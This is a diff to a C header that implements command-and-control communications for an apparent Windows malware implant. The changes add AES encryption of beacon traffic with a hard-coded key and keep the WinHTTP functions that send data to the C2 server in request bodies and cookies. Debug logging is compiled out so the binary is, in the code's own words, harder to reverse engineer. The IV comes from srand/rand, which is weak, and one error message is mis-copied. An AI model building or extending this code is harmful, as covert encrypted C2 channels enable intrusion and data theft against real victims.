@@ -1,42 +1,59 @@
 #ifndef C2_COMMS
 #define C2_COMMS
-#endif
 
+// Need to do this because windows is stupid
+#define WIN32_NO_STATUS
+#include <Windows.h>
+#undef WIN32_NO_STATUS
+
+#include <stdlib.h>
 #include <stdio.h>
+#include <string.h>
+#include <time.h>
+#include <shlwapi.h>
+#include <ntstatus.h>
 #include <winhttp.h>
 #include <wincrypt.h>
+#include <bcrypt.h>
+#include <processthreadsapi.h>
+
+#pragma comment(lib, "Shlwapi.lib")
+#pragma comment(lib, "Advapi32.lib")
+#pragma comment(lib, "Pathcch.lib")
 #pragma comment(lib, "Winhttp.lib")
 #pragma comment(lib, "Crypt32.lib")
+#pragma comment(lib, "Bcrypt.lib")
 
 
-// Conditionally compile logging function only when debug flag is set.
-// This will make the program harder to reverse engineer since it won't have
-// error messages anywhere.
-#ifdef DEBUG
-void c2_log(const char* format, ...) {
-    va_list args;
-    int ret;
+// Function declarations
+// -----------------------------------------------------------------------
+int SetupComms();
+void TearDownComms();
+void ResetHTTPHandle();
+char* base64(char* input, int len);
+char* unbase64(char* input, int len);
+char* Encrypt(char* msg, int len, int* pOutLen);
+char* Decrypt(char* ciphertext, int len, int* pOutLen);
+void c2_log(const char* format, ...);
+int c2_send(char* buffer, int len);
+int c2_send_body(char* buffer, int len);
+int c2_recv(char* buffer, int len);
+// -----------------------------------------------------------------------
 
-    va_start(args, format);
-    vprintf(format, args);
-    va_end(args);
-}
-#else
-void c2_log(const char* format, ...) {
-    return;
-}
-#endif
 
 // Configurations
-#define C2_IP L"127.0.0.1"
-#define C2_PORT 80
-#define C2_API_ENDPOINT L"/post"
-#define C2_USER_AGENT L"TESTNG AGENT"
+const wchar_t* C2_IP           = L"127.0.0.1";
+const short    C2_PORT         = 80;
+const wchar_t* C2_API_ENDPOINT = L"/post";
+const wchar_t* C2_USER_AGENT   = L"TESTNG AGENT";
+char           C2_AES_KEY[16]  = { 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41 };
 
 // Global handles for communication
-HINTERNET hSession;
-HINTERNET hConnect;
-HINTERNET hRequest;
+HINTERNET hSession       = NULL;
+HINTERNET hConnect       = NULL;
+HINTERNET hRequest       = NULL;
+BCRYPT_ALG_HANDLE hCrypt = NULL;
+BCRYPT_KEY_HANDLE hKey   = NULL;
 
 const char* ACCEPTED_FILETYPES[] = {"text/html", NULL}; // unused for now
 
@@ -49,6 +66,8 @@ HANDLE HEAP;
 // Sets up global HTTP connection handlers.
 // Returns 0 on success and -1 on failure.
 int SetupComms() {
+    NTSTATUS status;
+
     // Setup HTTP context
     HINTERNET hSession = WinHttpOpen(C2_USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if(! hSession) {
@@ -74,20 +93,37 @@ int SetupComms() {
         return -1;
     }
 
+    // Setup encryption context
+    // TODO: maybe negotioate Diffie-Hellman key exchange rather than hard coding key
+    status = BCryptOpenAlgorithmProvider(&hCrypt, BCRYPT_AES_ALGORITHM, NULL, 0);
+    if (status != STATUS_SUCCESS) {
+        c2_log("[!] SetupComms:BCryptOpenAlgorithmProvider failed with status 0x%x\n", status);
+        return -1;
+    }
+
+    // Generate key
+    status = BCryptGenerateSymmetricKey(hCrypt, &hKey, NULL, 0, C2_AES_KEY, sizeof(C2_AES_KEY), 0);
+    if (status != STATUS_SUCCESS) {
+        c2_log("[!] SetupComms:BCryptGenerateSymmetricKey failed with status 0x%x\n", status);
+        return -1;
+    }
+
     return 0;
 }
 
 
-// Cleans up HTTP handles
+// Cleans up handles
 void TearDownComms() {
-    if (hRequest) {WinHttpCloseHandle(hRequest);}
-    if (hConnect) {WinHttpCloseHandle(hConnect);}
-    if (hSession) {WinHttpCloseHandle(hSession);}
+    if (hKey)       {BCryptDestroyKey(hKey);}
+    if (hCrypt)     {BCryptCloseAlgorithmProvider(hCrypt, 0);}
+    if (hRequest)   {WinHttpCloseHandle(hRequest);}
+    if (hConnect)   {WinHttpCloseHandle(hConnect);}
+    if (hSession)   {WinHttpCloseHandle(hSession);}
 }
 
 
 // Resets a request handle to that it can be reused.
-void c2_reset_handle() {
+void ResetHTTPHandle() {
     // Close if it exists already
     if (hRequest)
         WinHttpCloseHandle(hRequest);
@@ -142,13 +178,72 @@ char* unbase64(char* buffer, int len) {
 }
 
 
+// Encrypts given message of length len.
+// Returns pointer to ciphertext buffer.
+char* Encrypt(char* msg, int len, int* pOutLen) {
+
+    NTSTATUS status;
+    char IV[16] = {0};
+    char* out;
+
+    // Generate random IV
+    srand ((unsigned int) time(NULL));
+    for(int i=0; i < 16; i++) {
+        IV[i] = (char) (rand() & 0xFF);
+    }
+
+    // First call will fail and tell us how much data to allocate (stored in pOutLen)
+    BCryptEncrypt(hKey, msg, len, NULL, IV, sizeof(IV), NULL, 0, pOutLen, BCRYPT_BLOCK_PADDING);
+
+    // Allocate memory
+    out = (char*) Malloc(*pOutLen);
+
+    // Now perform actual encryption
+    status = BCryptEncrypt(hKey, msg, len, NULL, IV, sizeof(IV), out, *pOutLen, pOutLen, BCRYPT_BLOCK_PADDING);
+    if (status != STATUS_SUCCESS) {
+        c2_log("[!] SetupComms:BCryptGenerateSymmetricKey failed with status 0x%x\n", status);
+        Free(out);
+        return NULL;
+    }
+
+    return out;
+}
+
+char* Decrypt(char* ciphertext, int len, int* pOutLen) {return NULL;}
+
+
+
+
+// =========================================================================
+// ============================ COMMS FUNCTIONS ============================
+// =========================================================================
+
+// Conditionally compile logging function only when debug flag is set.
+// This will make the program harder to reverse engineer since it won't have
+// error messages anywhere.
+#ifdef DEBUG
+void c2_log(const char* format, ...) {
+    va_list args;
+    int ret;
+
+    va_start(args, format);
+    vprintf(format, args);
+    va_end(args);
+}
+#else
+void c2_log(const char* format, ...) {
+    return;
+}
+#endif
+
+
 // Sends data to C2 server in body of  HTTP request.
 // More suitable for large amounts of data than c2_send.
 // Len is length of data.
 int c2_send_body(char* data, int len) {
     BOOL result;
 
-    c2_reset_handle();
+    ResetHTTPHandle();
 
     result = WinHttpSendRequest(
         hRequest,
@@ -208,7 +303,7 @@ int c2_send(char* data, int len) {
     wchar_t* data_wide; // data in wide char format
     wchar_t* cookie;
 
-    c2_reset_handle();
+    ResetHTTPHandle();
 
     // c2_log("SEND DATA: %s\n", data);
     // c2_log("SEND LEN : %d\n", len);
@@ -255,3 +350,5 @@ int c2_send(char* data, int len) {
 
     return len;
 }
+
+#endif
